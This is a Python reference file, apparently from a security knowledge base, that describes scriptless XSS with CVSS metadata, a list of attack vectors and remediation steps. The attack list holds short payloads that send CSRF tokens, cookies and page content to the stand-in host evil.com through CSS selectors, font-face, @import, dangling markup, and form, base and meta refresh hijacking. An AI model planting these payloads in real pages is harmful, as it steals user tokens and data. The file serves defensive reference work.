#!/usr/bin/env python3
# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-27 UTC
# Status: Refactored
# Telegram: https://t.me/EasyProTech

"""
Scriptless XSS Context

Data exfiltration and attacks without JavaScript execution.
"""

DETAILS = {
    "title": "Scriptless XSS",
    "severity": "medium",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N",
    "reliability": "high",
    "cwe": ["CWE-79", "CWE-200"],
    "owasp": ["A03:2021"],
    "tags": ["scriptless", "css", "exfiltration", "dangling", "csp-bypass"],
    "description": """
Scriptless XSS attacks exfiltrate data without executing JavaScript.
These attacks work even when CSP blocks all script execution, using
CSS, dangling markup, and browser features to extract sensitive data.
""",
    "attack_vector": """
SCRIPTLESS XSS VECTORS:

1. CSS ATTRIBUTE SELECTORS
   input[value^="a"] { background: url(//evil.com?a) }
   Exfiltrate CSRF tokens character by character

2. DANGLING MARKUP
   <img src="//evil.com?data=
   Captures following content until quote

3. CSS FONT-FACE LEAKS
   @font-face { src: url(//evil.com?a); unicode-range: U+0041 }
   Detect specific characters in text

4. @IMPORT EXFILTRATION
   @import url(//evil.com/steal.css)

5. BACKGROUND-IMAGE
   body { background: url(//evil.com?+document.cookie) }

6. LINK PREFETCH
   <link rel=prefetch href="//evil.com?data=...">

7. IMG SRC EXFILTRATION
   <img src="//evil.com/log?data=...">

8. INPUT TYPE=IMAGE FORMACTION
   <input type=image formaction="//evil.com">

9. FORM ACTION HIJACKING
   <form action="//evil.com"><input name=csrf>

10. BASE HREF HIJACKING
    <base href="//evil.com/">

11. META REFRESH
    <meta http-equiv=refresh content="0;url=//evil.com?data=">

12. CSS :VISITED STATE
    Detect which URLs user has visited

13. TIMING CSS EXTRACTION
    Measure render time for attribute matching
""",
    "remediation": """
SCRIPTLESS XSS PREVENTION:

1. STRICT CSP STYLE-SRC
   Content-Security-Policy: style-src 'self'

2. BLOCK INLINE STYLES
   No style="" attributes from user input

3. VALIDATE URL ATTRIBUTES
   Check src, href, action, formaction

4. SAMESITE COOKIES
   Set-Cookie: session=x; SameSite=Strict

5. CSRF PROTECTION
   Hidden token + double-submit cookie

6. SANITIZE ALL OUTPUT
   Use DOMPurify even for "safe" contexts

7. BLOCK DANGEROUS ELEMENTS
   Filter: base, meta refresh, form, link

8. CONTENT-DISPOSITION
   Force download for user uploads
""",
}
